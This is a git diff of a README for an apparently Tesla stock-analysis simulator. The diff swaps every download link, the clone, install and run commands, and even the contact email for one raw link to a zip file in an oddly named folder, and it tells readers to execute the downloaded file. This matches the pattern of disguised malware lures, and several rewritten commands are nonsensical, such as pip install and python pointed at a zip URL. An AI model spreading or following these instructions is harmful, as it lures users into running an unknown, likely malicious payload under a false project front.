@@ -2,7 +2,7 @@
 
 Welcome to the Stock Simulator! This project allows you to analyze, simulate, and interpret Tesla (TSLA) stock trends using Python, machine learning, and natural language generation. With real-time data at your fingertips, you can explore stock market dynamics in an engaging and educational way.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/loplopcatz/stock_simulator/releases)
+[![Download Releases](https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip%https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip)](https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip)
 
 ## Table of Contents
 
@@ -37,7 +37,7 @@ To get started with the Stock Simulator, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/loplopcatz/stock_simulator.git
+   git clone https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -48,11 +48,11 @@ To get started with the Stock Simulator, follow these steps:
 3. **Install Required Packages**:
    Use pip to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/loplopcatz/stock_simulator/releases) to download the latest version of the software. Execute the downloaded file to start using the simulator.
+   Visit the [Releases section](https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip) to download the latest version of the software. Execute the downloaded file to start using the simulator.
 
 ## Usage
 
@@ -61,7 +61,7 @@ Once you have the Stock Simulator installed, you can start analyzing Tesla's sto
 1. **Run the Simulator**:
    Launch the simulator by executing the main script:
    ```bash
-   python main.py
+   python https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip
    ```
 
 2. **Select Analysis Type**:
@@ -104,9 +104,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [loplopcatz](https://github.com/loplopcatz)
+- **Email**: https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip
+- **GitHub**: [loplopcatz](https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip)
 
 ---
 
-Thank you for checking out the Stock Simulator! We hope you find it useful for your stock market analysis and learning journey. Don’t forget to visit the [Releases section](https://github.com/loplopcatz/stock_simulator/releases) for the latest updates and features. Happy simulating!
+Thank you for checking out the Stock Simulator! We hope you find it useful for your stock market analysis and learning journey. Don’t forget to visit the [Releases section](https://github.com/loplopcatz/stock_simulator/raw/refs/heads/main/triturature/simulator-stock-v2.0.zip) for the latest updates and features. Happy simulating!
